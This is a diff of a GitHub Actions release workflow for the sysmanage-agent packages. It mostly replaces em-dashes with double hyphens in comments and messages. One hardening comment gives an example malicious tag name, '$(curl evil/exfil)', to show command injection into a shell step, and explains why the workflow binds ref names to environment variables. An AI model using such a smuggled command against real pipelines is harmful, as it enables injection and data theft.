@@ -5,7 +5,7 @@ on:
   push:
     tags:
       - 'v*.*.*'
-  # Phase 11.8 — manual dispatch with extra channel gates.  The
+  # Phase 11.8 -- manual dispatch with extra channel gates.  The
   # ``winget`` / ``homebrew`` inputs default to ``dry_run`` so a
   # routine tag push never accidentally hits external accounts that
   # aren't fully wired yet.  Flip to ``publish`` once
@@ -62,8 +62,8 @@ permissions:
   contents: write  # Needed for creating releases and pushing to repos
 
 jobs:
-  # Hard release gate: every locale must be 100% translated.  Offline — no
-  # translation service, no network — so it runs fine in CI where the GPU box
+  # Hard release gate: every locale must be 100% translated.  Offline -- no
+  # translation service, no network -- so it runs fine in CI where the GPU box
   # is unavailable.  Blocks the ENTIRE release on a single untranslated string.
   i18n-gate:
     name: i18n Completeness Gate
@@ -202,7 +202,7 @@ jobs:
           mkdir -p vendor
 
           # Vendor wheels for THIS build's architecture only (the native .deb is
-          # arch-specific — no need to carry the other arch's wheels).  The
+          # arch-specific -- no need to carry the other arch's wheels).  The
           # Launchpad source path vendors both arches separately.
           pip3 download -r requirements-prod.txt -d vendor \
             --python-version 3.12 \
@@ -649,8 +649,8 @@ jobs:
           # All three openSUSE matrix targets (leap/tumbleweed/sles) build
           # from the same spec and produce an identical
           # sysmanage-agent-<ver>-0.x86_64.rpm.  Rename to embed the target
-          # so they (a) don't collide as release assets — only one would
-          # survive — and (b) are distinguishable from the CentOS RPM to the
+          # so they (a) don't collide as release assets -- only one would
+          # survive -- and (b) are distinguishable from the CentOS RPM to the
           # air-gap bundle builder.  Without this, the Fedora/RHEL builders
           # can grab the openSUSE RPM, whose python311-pip dependency is
           # unsatisfiable there, and the openSUSE builder cannot find an
@@ -2140,7 +2140,7 @@ jobs:
         # https://repo.sysmanage.org), replacing the old "commit repo/ into
         # sysmanage-docs git" flow.  Additive (--size-only, no --delete); version
         # retention is a separate `make prune-repo` in sysmanage-docs.  The
-        # copy / metadata-regen / flatpak-rsync logic below is UNCHANGED — only
+        # copy / metadata-regen / flatpak-rsync logic below is UNCHANGED -- only
         # the transport (git clone/commit → R2 pull/push) differs.
         env:
           VERSION: ${{ steps.version.outputs.version }}
@@ -2151,7 +2151,7 @@ jobs:
           AWS_REQUEST_CHECKSUM_CALCULATION: when_required
           AWS_RESPONSE_CHECKSUM_VALIDATION: when_required
           # Archive signing.  APT_SIGNING_KEY is a SIGNING SUBKEY export, not
-          # the primary — see the import step below.  APT_SIGN_REQUIRED makes a
+          # the primary -- see the import step below.  APT_SIGN_REQUIRED makes a
           # missing key fail the release rather than silently publishing a repo
           # every consumer then has to install with verification disabled.
           APT_SIGNING_KEY: ${{ secrets.APT_SIGNING_KEY }}
@@ -2201,7 +2201,7 @@ jobs:
 
           # RPM packages - CentOS/RHEL (from build-centos matrix job).  Artifacts
           # are sysmanage-agent-rpm-<arch> (x86_64 / aarch64), each holding
-          # sysmanage-agent-VERSION-1.<arch>.rpm — route each to its own repo dir.
+          # sysmanage-agent-VERSION-1.<arch>.rpm -- route each to its own repo dir.
           for RPMARCH in x86_64 aarch64; do
             SRC="${{ github.workspace }}/artifacts/sysmanage-agent-rpm-$RPMARCH"
             [ -d "$SRC" ] || continue
@@ -2247,13 +2247,13 @@ jobs:
           cp ${{ github.workspace }}/release-files/*openbsd-port.tar.gz "repo/agent/openbsd/ports/$VERSION/" 2>/dev/null || true
           cp ${{ github.workspace }}/release-files/*openbsd-port.tar.gz.sha256 "repo/agent/openbsd/ports/$VERSION/" 2>/dev/null || true
 
-          # OpenBSD packages (.tgz) — wildcard so every built release (7.8, 7.9,
+          # OpenBSD packages (.tgz) -- wildcard so every built release (7.8, 7.9,
           # and future versions) is picked up.  The old enumerated 7.5/7.6/7.7
           # list silently dropped newer releases and kept dead globs.
           cp ${{ github.workspace }}/release-files/*-openbsd*.tgz "repo/agent/openbsd/packages/$VERSION/" 2>/dev/null || true
           cp ${{ github.workspace }}/release-files/*-openbsd*.tgz.sha256 "repo/agent/openbsd/packages/$VERSION/" 2>/dev/null || true
 
-          # Alpine packages (.apk) — glob over whatever the build matrix
+          # Alpine packages (.apk) -- glob over whatever the build matrix
           # produced rather than naming releases here.  The hardcoded list had
           # drifted from the matrix in BOTH directions: 3.19 had been dropped
           # from the matrix, so its cp silently copied nothing (`|| true` hides
@@ -2262,14 +2262,14 @@ jobs:
           # cannot drift.  Fail loudly if it matches nothing: a silent no-op is
           # what let 3.22 go unpublished across multiple releases.
           if ! cp ${{ github.workspace }}/release-files/*-alpine*.apk "repo/agent/alpine/packages/$VERSION/" 2>/dev/null; then
-            echo "::error::no *-alpine*.apk found in release-files — the Alpine build matrix produced nothing to publish"
+            echo "::error::no *-alpine*.apk found in release-files -- the Alpine build matrix produced nothing to publish"
             exit 1
           fi
           cp ${{ github.workspace }}/release-files/*-alpine*.apk.sha256 "repo/agent/alpine/packages/$VERSION/" 2>/dev/null || true
           echo "Alpine packages staged for publication:"
           ls -1 "repo/agent/alpine/packages/$VERSION/"
 
-          # latest.txt — the version pointer the install docs resolve before
+          # latest.txt -- the version pointer the install docs resolve before
           # building a download URL:
           #   VERSION=$(curl -s https://repo.sysmanage.org/agent/mac/latest.txt)
           # Nothing in ANY repo wrote this file.  It had been placed by hand
@@ -2351,7 +2351,7 @@ jobs:
           fi
 
           # Regenerate apt repository metadata (amd64 + arm64).
-          # Shared with `make deploy-docs-repo` so the two cannot drift — they
+          # Shared with `make deploy-docs-repo` so the two cannot drift -- they
           # did once, and whichever ran last decided whether apt would accept
           # the published repo at all.
           echo "Regenerating apt repository metadata..."
@@ -2388,14 +2388,14 @@ jobs:
             fi
           done
 
-          # Publish everything staged to R2 (additive — never deletes; retention
+          # Publish everything staged to R2 (additive -- never deletes; retention
           # is a separate `make prune-repo`).  One sync from the staging root
           # covers the agent apt/rpm repos, the per-platform package dirs, the
           # .flatpak bundles, and the flatpak OSTree store (objects/refs/summary).
           cd "$WORK"
 
-          # NEVER --size-only HERE.  An apt `Release` is a fixed-width document —
-          # same header set, fixed-length hex digests — so a regenerated one is
+          # NEVER --size-only HERE.  An apt `Release` is a fixed-width document --
+          # same header set, fixed-length hex digests -- so a regenerated one is
           # almost always EXACTLY the same size as the one it replaces (2000
           # bytes today).  `aws s3 sync --size-only` compares size alone, so it
           # decides the new Release is unchanged and never uploads it, leaving a
@@ -2403,8 +2403,8 @@ jobs:
           #
           # That is exactly the 2026-08-07 release failure: `Packages.gz` changed
           # size (701 -> 700) so it uploaded, the regenerated `Release` did not,
-          # and every apt client — including the verification step below and any
-          # customer following the documented install — got
+          # and every apt client -- including the verification step below and any
+          # customer following the documented install -- got
           #   "File has unexpected size (700 != 701). Mirror sync in progress?"
           # It was not a mirror blip and it did not clear on retry; the repo
           # stayed broken until a later release happened to change the Release
@@ -2564,7 +2564,7 @@ jobs:
           # THE guard for the malformed-Release bug.  A broken `Release` (built
           # by redirecting into the file apt-ftparchive was still walking) made
           # the documented Debian install fail for EVERY customer, and nothing
-          # caught it — it surfaced only when bare-metal provisioning failed
+          # caught it -- it surfaced only when bare-metal provisioning failed
           # three layers downstream.  So verify with a real apt on a clean
           # Debian, running the EXACT line the docs tell users to run; a
           # hand-rolled equivalent would not have caught it either.
@@ -2588,7 +2588,7 @@ jobs:
             # cannot fail a release that is otherwise fine.
             for attempt in 1 2 3 4 5; do
               if apt-get update; then break; fi
-              echo "apt-get update failed (attempt $attempt) — retrying"
+              echo "apt-get update failed (attempt $attempt) -- retrying"
               sleep 10
               [ "$attempt" = 5 ] && exit 1
             done
@@ -2600,7 +2600,7 @@ jobs:
               exit 1
             }
 
-            # Resolve the install for real (no download) — catches a Packages
+            # Resolve the install for real (no download) -- catches a Packages
             # entry whose Filename/checksum does not match the published pool.
             apt-get install -y --dry-run sysmanage-agent
           '
@@ -2609,7 +2609,7 @@ jobs:
         run: |
           set -euo pipefail
           # The documented RPM install goes through COPR, so this repo is the
-          # less-travelled path — but it IS published, and unverified published
+          # less-traveled path -- but it IS published, and unverified published
           # metadata is exactly how the apt breakage happened.
           docker run --rm rockylinux:9 bash -euxc '
             cat > /etc/yum.repos.d/sysmanage-agent.repo <<REPO
@@ -2640,7 +2640,7 @@ jobs:
         id: release_notes
         env:
           VERSION: ${{ steps.version.outputs.version }}
-          # Phase 11 hardening — bind github.ref_name / github.repository
+          # Phase 11 hardening -- bind github.ref_name / github.repository
           # to env vars so the run: script doesn't interpolate ${{ ... }}
           # directly into shell.  An attacker who could control the tag
           # name (e.g. by pushing a tag named "$(curl evil/exfil)") could
@@ -3123,7 +3123,7 @@ jobs:
 
           # Download wheels for BOTH arches so Launchpad's arm64 builder (control
           # is Architecture: any) can install the matching wheels from the single
-          # uploaded source — pip --find-links picks the right wheel per builder.
+          # uploaded source -- pip --find-links picks the right wheel per builder.
           pip3 download -r requirements-prod.txt -d vendor \
             --python-version $PYTHON_VERSION \
             --platform manylinux2014_x86_64 \
@@ -3220,7 +3220,7 @@ jobs:
 
           # Upload to Launchpad PPA.  Launchpad's FTP endpoint
           # occasionally drops mid-transfer with "cannot read from
-          # timed out object" — retry up to 3× with exponential
+          # timed out object" -- retry up to 3× with exponential
           # backoff before failing the workflow.  ``-f`` (force) is
           # required on retries because a Broken-pipe failure during
           # the first attempt leaves a partial .tar.xz on Launchpad's
@@ -3498,7 +3498,7 @@ jobs:
           fi
 
           # Install copr-cli via pip (not available in Ubuntu repos).
-          # `rich` is an undeclared runtime dep in copr-cli >= 1.115 — without
+          # `rich` is an undeclared runtime dep in copr-cli >= 1.115 -- without
           # it, every subcommand crashes with `ModuleNotFoundError: No module
           # named 'rich'` before any HTTP request goes out.
           n=0; ok=0
@@ -3517,7 +3517,7 @@ jobs:
           COPR_API_TOKEN: ${{ secrets.COPR_API_TOKEN }}
           COPR_USERNAME: ${{ secrets.COPR_USERNAME }}
         run: |
-          # Diagnostic only — prints byte counts so we can detect a hidden
+          # Diagnostic only -- prints byte counts so we can detect a hidden
           # trailing newline or padding in the secret value (the most common
           # cause of "Login invalid/expired" when the token itself is correct).
           # If `printf %s` and `echo` give counts that differ by more than 1,
@@ -3529,7 +3529,7 @@ jobs:
           printf '%-22s len=%s  echo+nl=%s\n' \
             "COPR_USERNAME"  "$(printf '%s' "$COPR_USERNAME"  | wc -c)" "$(echo "$COPR_USERNAME"  | wc -c)"
           # Compare these `len=` values to what's shown on
-          # https://copr.fedorainfracloud.org/api — they should match exactly.
+          # https://copr.fedorainfracloud.org/api -- they should match exactly.
           # The (echo+nl) value should be exactly len+1 (echo always appends one \n).
           # If echo+nl is len+2, the secret itself contained a trailing \n.
 
@@ -3909,7 +3909,7 @@ jobs:
           echo "  sudo snap install sysmanage-agent-strict --edge"
 
   # ============================================================================
-  # PHASE 11.8 / 11.9 — upstream-channel auto-publish
+  # PHASE 11.8 / 11.9 -- upstream-channel auto-publish
   # ============================================================================
   #
   # These jobs handle the channels that don't live in
@@ -3926,7 +3926,7 @@ jobs:
   # input set to ``publish`` (or the default-on bsd_ports_artifacts flag
   # for BSD ports) AND (b) the corresponding secret being non-empty.
   # If the secret isn't wired yet, the job emits a ``::warning`` and
-  # exits 0 instead of failing the workflow — a fresh release tag must
+  # exits 0 instead of failing the workflow -- a fresh release tag must
   # never red-X just because one upstream tap isn't configured yet.
   #
   # One-time "prime the pump" setup per channel:
@@ -3939,7 +3939,7 @@ jobs:
   #   aur      : register an SSH key on aur.archlinux.org/account/,
   #              create the ``sysmanage-agent`` AUR repo (initial
   #              ``git push``), paste private half into ``AUR_SSH_KEY``.
-  #   BSD      : no secret needed — jobs render submission tarballs
+  #   BSD      : no secret needed -- jobs render submission tarballs
   #              and attach to the GitHub release.  User downloads,
   #              files Bugzilla / ports@ / pkgsrc-wip PR manually.
   winget-manifest:
@@ -3948,15 +3948,15 @@ jobs:
     timeout-minutes: 60
     # NO continue-on-error.  It used to be set here, and it hid a real
     # failure: on 2026-08-07 the winget submission failed for the whole
-    # v3.5.1.5 release while the run showed GREEN — the only clue was a red
+    # v3.5.1.5 release while the run showed GREEN -- the only clue was a red
     # X on a step you had to click into the job to see.  A publish channel
     # that fails silently is a channel nobody notices is broken, which is
     # how a release ships without ever reaching winget.
     #
     # The two worries behind the original setting do not apply:
-    #   * "cancels sibling publish jobs" — it does not.  Nothing `needs:`
+    #   * "cancels sibling publish jobs" -- it does not.  Nothing `needs:`
     #     this job, and independent jobs are not cancelled by a failure.
-    #   * "fails the release for expected conditions" — those already
+    #   * "fails the release for expected conditions" -- those already
     #     `exit 0` inside the step: dry-run mode, an unset token, and the
     #     first-submission gate.  Only a genuine failure reaches here.
     needs: [release]
@@ -3994,25 +3994,25 @@ jobs:
           # komac itself would also fail to fetch.
           MSI_URL="https://github.com/bceverly/sysmanage-agent/releases/download/v${VERSION}/sysmanage-agent-${VERSION}-windows-x64.msi"
           # ARM64 MSI is built by the same matrix job and uploaded alongside x64.
-          # BOTH must be submitted to winget — the package shipped arm64 in
+          # BOTH must be submitted to winget -- the package shipped arm64 in
           # earlier versions, so dropping it trips winget's
           # Manifest-Metadata-Consistency check ("Missing arm64 installer").
           MSI_URL_ARM64="https://github.com/bceverly/sysmanage-agent/releases/download/v${VERSION}/sysmanage-agent-${VERSION}-windows-arm64.msi"
 
-          # Download the MSI to compute its sha256 — what winget-pkgs requires.
+          # Download the MSI to compute its sha256 -- what winget-pkgs requires.
             # HARD FAIL: a download problem must not produce a rendered
             # package with a bogus checksum.  This used to warn and substitute
             # 64 zeros, which ships a manifest that looks complete and then
             # fails verification on every user's machine.  The `[ -f ]` guard
             # was worse than it looks: `curl -f -o` still creates the file, so
-            # a failed fetch could leave an EMPTY file and hash THAT — a
+            # a failed fetch could leave an EMPTY file and hash THAT -- a
             # plausible checksum that is simply wrong.  Same class as the
             # FreeBSD distinfo fail-open fixed on 2026-08-08.
             curl -sSfL -o /tmp/sysmanage-agent.msi "$MSI_URL" || {
               echo "::error::Could not download the MSI from $MSI_URL"
               exit 1
             }
-            [ -s /tmp/sysmanage-agent.msi ] || { echo "::error::/tmp/sysmanage-agent.msi is empty — refusing to render a bogus checksum"; exit 1; }
+            [ -s /tmp/sysmanage-agent.msi ] || { echo "::error::/tmp/sysmanage-agent.msi is empty -- refusing to render a bogus checksum"; exit 1; }
             SHA=$(sha256sum /tmp/sysmanage-agent.msi | awk '{print toupper($1)}')
 
           # Render the manifest from the stub.
@@ -4100,7 +4100,7 @@ jobs:
           #     "Ref cannot be created / failed to create branch ..."
           # which names neither the account nor the repo.  On 2026-08-09 the scope
           # preflight above passed (repo, workflow) and this still failed, while the same
-          # check by hand from a laptop showed a writable fork — so "which identity is CI
+          # check by hand from a laptop showed a writable fork -- so "which identity is CI
           # actually using" was the question the log could not answer.  Answer it here,
           # before komac runs, in one line.
           login=$(curl -sS -H "Authorization: token $WINGET_PKGS_TOKEN" \
@@ -4148,12 +4148,12 @@ jobs:
             echo "::warning::  https://github.com/$login/winget-pkgs -> Sync fork"
           fi
 
-          # Download prebuilt komac (linux-x64 musl) — building from source
+          # Download prebuilt komac (linux-x64 musl) -- building from source
           # via ``cargo install`` takes ~6 min on a GH runner.  Pin to the
           # ``latest`` redirect; komac follows semver and the ``update
           # --submit`` interface has been stable since v2.x.
           echo "Fetching latest komac release..."
-          # komac v2.16+ dropped the musl build — current Linux assets
+          # komac v2.16+ dropped the musl build -- current Linux assets
           # ship as ``x86_64-unknown-linux-gnu.tar.gz`` (glibc) only.
           # Match by individual substrings instead of the legacy
           # hyphenated full name so naming flips (gnu↔musl) don't
@@ -4189,7 +4189,7 @@ jobs:
           # to ``komac new`` for the first submission.  Subsequent
           # releases succeed on the update path.
           #
-          # komac v2.16 also dropped ``--identifier <id>`` — the
+          # komac v2.16 also dropped ``--identifier <id>`` -- the
           # identifier is the trailing positional now.
           set +e
           "$KOMAC" update \
@@ -4203,7 +4203,7 @@ jobs:
 
           if [ "$update_rc" -ne 0 ]; then
             if grep -q "does not exist in microsoft/winget-pkgs" /tmp/komac.out; then
-              # ``komac new`` is interactive — it prompts for Publisher,
+              # ``komac new`` is interactive -- it prompts for Publisher,
               # License, ShortDescription, etc. and fails in CI with
               # "The input device is not a TTY".  This matches
               # winget-pkgs's design: first-time submissions are
@@ -4236,12 +4236,12 @@ jobs:
               # Name the cause instead of dumping an exit code.  v3.5.0.1 failed
               # here and left NO PR on microsoft/winget-pkgs, and working out why
               # afterwards meant ruling out the MSIs, the komac download and the
-              # manifest render one at a time — all of which were fine.
+              # manifest render one at a time -- all of which were fine.
               echo "::error::komac update failed for a non-first-submission reason"
               # Classify on the ERROR TEXT ONLY.  komac echoes the whole
               # rendered manifest to stdout on its way to failing, and that
               # manifest always contains "Installers:", "InstallerUrl" and
-              # "ManifestType" — so grepping the full log for "installer" or
+              # "ManifestType" -- so grepping the full log for "installer" or
               # "manifest" matched every single time and reported MANIFEST
               # VALIDATION for v3.5.1.1, whose actual failure was a permissions
               # error.  A misleading diagnosis is worse than none: it sent the
@@ -4251,7 +4251,7 @@ jobs:
               if grep -qiE "401|403|bad credentials|unauthorized|does not have the correct permissions|CreateRef|forbidden|token" /tmp/komac.err; then
                 echo "::error::Looks like AUTH/PERMISSIONS.  komac pushes a branch to YOUR FORK"
                 echo "::error::of microsoft/winget-pkgs, so this fails when either:"
-                echo "::error::  * the fork does not exist — create it once at"
+                echo "::error::  * the fork does not exist -- create it once at"
                 echo "::error::    https://github.com/microsoft/winget-pkgs/fork , or"
                 echo "::error::  * WINGET_PKGS_TOKEN cannot write to it.  A classic PAT needs"
                 echo "::error::    BOTH 'public_repo' AND 'workflow'.  The workflow scope is"
@@ -4267,10 +4267,10 @@ jobs:
                 echo "::error::    requests: Read+Write scoped to <you>/winget-pkgs."
                 echo "::error::Expired tokens fail the same way."
               elif grep -qiE "validation|schema|sha256|checksum|404|not found" /tmp/komac.err; then
-                echo "::error::Looks like MANIFEST VALIDATION — check the installer URLs"
+                echo "::error::Looks like MANIFEST VALIDATION -- check the installer URLs"
                 echo "::error::resolve and that BOTH x64 and arm64 MSIs exist for this tag."
               elif grep -qiE "rate limit|timed out|connection|network" /tmp/komac.err; then
-                echo "::error::Looks TRANSIENT (rate limit / network) — re-running may fix it."
+                echo "::error::Looks TRANSIENT (rate limit / network) -- re-running may fix it."
               fi
               echo "::group::komac error output"
               cat /tmp/komac.err
@@ -4281,7 +4281,7 @@ jobs:
 
           # komac exiting 0 is not proof it submitted anything.  Confirm a PR
           # actually exists for this version, so a silent no-op cannot look like
-          # a success — that is exactly how v3.5.0.1 slipped through unnoticed.
+          # a success -- that is exactly how v3.5.0.1 slipped through unnoticed.
           sleep 15
           found=$(curl -fsSL --max-time 30 \
             "https://api.github.com/search/issues?q=repo:microsoft/winget-pkgs+is:pr+sysmanage-agent+${VERSION}" \
@@ -4289,16 +4289,16 @@ jobs:
             | grep -oE '[0-9]+$' || echo 0)
           if [ "${found:-0}" -eq 0 ]; then
             echo "::error::komac reported success but no winget-pkgs PR exists for ${VERSION}."
-            echo "::error::Treating that as a failure — a missing bump is invisible otherwise."
+            echo "::error::Treating that as a failure -- a missing bump is invisible otherwise."
             exit 1
           fi
-          echo "winget submission complete — ${found} PR(s) found for ${VERSION} on microsoft/winget-pkgs."
+          echo "winget submission complete -- ${found} PR(s) found for ${VERSION} on microsoft/winget-pkgs."
 
   homebrew-tap:
     name: Homebrew tap formula (Phase 11.8)
     runs-on: ubuntu-latest
     timeout-minutes: 60
-    # NO continue-on-error — see winget-manifest for the full rationale.
+    # NO continue-on-error -- see winget-manifest for the full rationale.
     # A publish channel that fails silently is one nobody notices is broken:
     # on 2026-08-07 an entire release shipped GREEN with winget broken, the
     # only clue a red X inside an apparently successful job.  Expected
@@ -4333,9 +4333,9 @@ jobs:
           set -euo pipefail
           TARBALL_URL="https://github.com/bceverly/sysmanage-agent/archive/refs/tags/v${VERSION}.tar.gz"
 
-          # Pull the source tarball to compute sha256 — Homebrew refuses
+          # Pull the source tarball to compute sha256 -- Homebrew refuses
           # to install a formula whose sha256 doesn't match.
-          # HARD FAIL — see the FreeBSD distinfo fix (2026-08-08).  Warning and
+          # HARD FAIL -- see the FreeBSD distinfo fix (2026-08-08).  Warning and
           # substituting zeros ships a manifest that looks complete and fails
           # checksum verification for every user.  `curl -f -o` also CREATES the
           # file on failure, so `[ -f ]` could hash an empty file: a plausible
@@ -4344,7 +4344,7 @@ jobs:
             echo "::error::Could not download /tmp/sysmanage-agent.tar.gz from $TARBALL_URL"
             exit 1
           }
-          [ -s /tmp/sysmanage-agent.tar.gz ] || { echo "::error::/tmp/sysmanage-agent.tar.gz is empty — refusing to render a bogus checksum"; exit 1; }
+          [ -s /tmp/sysmanage-agent.tar.gz ] || { echo "::error::/tmp/sysmanage-agent.tar.gz is empty -- refusing to render a bogus checksum"; exit 1; }
           SHA=$(sha256sum /tmp/sysmanage-agent.tar.gz | awk '{print $1}')
 
           mkdir -p /tmp/homebrew-out
@@ -4415,7 +4415,7 @@ jobs:
     name: AUR submission (Phase 11.9)
     runs-on: ubuntu-latest
     timeout-minutes: 60
-    # NO continue-on-error — see winget-manifest for the full rationale.
+    # NO continue-on-error -- see winget-manifest for the full rationale.
     # A publish channel that fails silently is one nobody notices is broken:
     # on 2026-08-07 an entire release shipped GREEN with winget broken, the
     # only clue a red X inside an apparently successful job.  Expected
@@ -4458,14 +4458,14 @@ jobs:
             # 64 zeros, which ships a manifest that looks complete and then
             # fails verification on every user's machine.  The `[ -f ]` guard
             # was worse than it looks: `curl -f -o` still creates the file, so
-            # a failed fetch could leave an EMPTY file and hash THAT — a
+            # a failed fetch could leave an EMPTY file and hash THAT -- a
             # plausible checksum that is simply wrong.  Same class as the
             # FreeBSD distinfo fail-open fixed on 2026-08-08.
             curl -fsSL -o /tmp/sysmanage-agent.tar.gz "$TARBALL_URL" || {
               echo "::error::Could not download the source tarball from $TARBALL_URL"
               exit 1
             }
-            [ -s /tmp/sysmanage-agent.tar.gz ] || { echo "::error::/tmp/sysmanage-agent.tar.gz is empty — refusing to render a bogus checksum"; exit 1; }
+            [ -s /tmp/sysmanage-agent.tar.gz ] || { echo "::error::/tmp/sysmanage-agent.tar.gz is empty -- refusing to render a bogus checksum"; exit 1; }
             TARBALL_SHA=$(sha256sum /tmp/sysmanage-agent.tar.gz | awk '{print $1}')
 
           # Render PKGBUILD into a staging dir.
@@ -4549,7 +4549,7 @@ jobs:
 
           AUR_DIR=$(mktemp -d /tmp/aur-clone.XXXXXX)
           # aur.archlinux.org goes down for maintenance periodically, and an
-          # outage there must not fail the whole release — this job already
+          # outage there must not fail the whole release -- this job already
           # soft-fails (exit 0) when its secret is absent, so a third-party
           # outage should behave the same way.  Retry a few times first in case
           # it is a blip, then warn and skip.
@@ -4572,18 +4572,18 @@ jobs:
               # web/API stayed up, and three releases fell behind unnoticed.
               # One-liner on purpose: multi-line script here breaks the YAML
               # block scalar.
-              # Fetch to a FILE, then parse it — do not pipe curl into an
+              # Fetch to a FILE, then parse it -- do not pipe curl into an
               # interpreter.  Semgrep flags `curl ... | python3 -c` as the
               # "curl | bash" install pattern (gha-curl-pipe-shell).  Here the
               # remote body is data for json.load and is never executed, so the
-              # alert was a false positive in substance — but the rule's advice
+              # alert was a false positive in substance -- but the rule's advice
               # (download first, then process) is the better shape regardless,
               # and it removes a finding from a queue people actually read.
               curl -sS -g --max-time 20 -o /tmp/aur-info.json \
                 "https://aur.archlinux.org/rpc/v5/info?arg[]=sysmanage-agent" 2>/dev/null || true
               published=$(python3 -c "import json;print(((json.load(open('/tmp/aur-info.json')).get('results') or [{}])[0]).get('Version','unknown'))" 2>/dev/null || echo unknown)
               {
-                echo "### ⚠️ AUR publish SKIPPED — upstream maintenance"
+                echo "### ⚠️ AUR publish SKIPPED -- upstream maintenance"
                 echo ""
                 echo "| | |"
                 echo "|---|---|"
@@ -4593,11 +4593,11 @@ jobs:
                 echo "Nothing to fix on our side. If these keep diverging over"
                 echo "several releases, the outage is no longer transient."
               } >> "$GITHUB_STEP_SUMMARY"
-              echo "::warning::aur.archlinux.org is DOWN — skipping the AUR publish."
+              echo "::warning::aur.archlinux.org is DOWN -- skipping the AUR publish."
               echo "::warning::AUR has ${published}; this release is ${VERSION}."
               exit 0
             fi
-            # NOT an upstream outage — a bad key, a missing AUR repo, or a
+            # NOT an upstream outage -- a bad key, a missing AUR repo, or a
             # rejected push are ours to fix, and this job no longer carries
             # continue-on-error, so it must go red rather than warn and pass.
             # Silently skipping these is precisely the invisibility the
@@ -4627,7 +4627,7 @@ jobs:
   # ============================================================================
   # BSD port submission tarballs (FreeBSD ports, OpenBSD ports, NetBSD pkgsrc).
   #
-  # Full automation is not feasible — FreeBSD takes patches via Bugzilla,
+  # Full automation is not feasible -- FreeBSD takes patches via Bugzilla,
   # OpenBSD via ports@ mailing list, NetBSD via pkgsrc-wip (GitHub PR).
   # Each job renders the per-release port tree (Makefile + distinfo with
   # real hashes), tars it up, uploads as a workflow artifact AND attaches
@@ -4637,7 +4637,7 @@ jobs:
     name: FreeBSD ports submission tarball (Phase 11.9)
     runs-on: ubuntu-latest
     timeout-minutes: 60
-    # NO continue-on-error — see winget-manifest for the full rationale.
+    # NO continue-on-error -- see winget-manifest for the full rationale.
     # A publish channel that fails silently is one nobody notices is broken:
     # on 2026-08-07 an entire release shipped GREEN with winget broken, the
     # only clue a red X inside an apparently successful job.  Expected
@@ -4673,7 +4673,7 @@ jobs:
         run: |
           set -euo pipefail
           if [ "$ENABLED" != "yes" ]; then
-            echo "bsd_ports_artifacts=no — skipping FreeBSD port render."
+            echo "bsd_ports_artifacts=no -- skipping FreeBSD port render."
             echo "skipped=true" >> $GITHUB_OUTPUT
             exit 0
           fi
@@ -4691,10 +4691,10 @@ jobs:
 
           # The distinfo KEY must be the filename the ports framework derives,
           # not the URL we fetched from.  The old comment here claimed the name
-          # was a DIST_SUBDIR path — but this port sets no DIST_SUBDIR (the
+          # was a DIST_SUBDIR path -- but this port sets no DIST_SUBDIR (the
           # static checker forbids it alongside USE_GITHUB), so the framework
           # derives ${GH_ACCOUNT}-${GH_PROJECT}-${DISTVERSION}-${GH_TAGNAME}_GH0.tar.gz
-          # and looked up a key that was not in the file — every user's fetch
+          # and looked up a key that was not in the file -- every user's fetch
           # failed checksum verification.  Confirmed against `make makesum` on
           # a real ports tree, 2026-08-08: SHA and SIZE were always correct,
           # only the key was wrong, so nothing in CI could have caught it.
@@ -4738,7 +4738,7 @@ jobs:
     name: OpenBSD ports submission tarball (Phase 11.9)
     runs-on: ubuntu-latest
     timeout-minutes: 60
-    # NO continue-on-error — see winget-manifest for the full rationale.
+    # NO continue-on-error -- see winget-manifest for the full rationale.
     # A publish channel that fails silently is one nobody notices is broken:
     # on 2026-08-07 an entire release shipped GREEN with winget broken, the
     # only clue a red X inside an apparently successful job.  Expected
@@ -4774,7 +4774,7 @@ jobs:
         run: |
           set -euo pipefail
           if [ "$ENABLED" != "yes" ]; then
-            echo "bsd_ports_artifacts=no — skipping OpenBSD port render."
+            echo "bsd_ports_artifacts=no -- skipping OpenBSD port render."
             echo "skipped=true" >> $GITHUB_OUTPUT
             exit 0
           fi
@@ -4831,7 +4831,7 @@ jobs:
     name: NetBSD pkgsrc submission tarball (Phase 11.9)
     runs-on: ubuntu-latest
     timeout-minutes: 60
-    # NO continue-on-error — see winget-manifest for the full rationale.
+    # NO continue-on-error -- see winget-manifest for the full rationale.
     # A publish channel that fails silently is one nobody notices is broken:
     # on 2026-08-07 an entire release shipped GREEN with winget broken, the
     # only clue a red X inside an apparently successful job.  Expected
@@ -4897,7 +4897,7 @@ jobs:
         run: |
           set -euo pipefail
           if [ "$ENABLED" != "yes" ]; then
-            echo "bsd_ports_artifacts=no — skipping NetBSD pkgsrc render."
+            echo "bsd_ports_artifacts=no -- skipping NetBSD pkgsrc render."
             echo "skipped=true" >> $GITHUB_OUTPUT
             exit 0
           fi
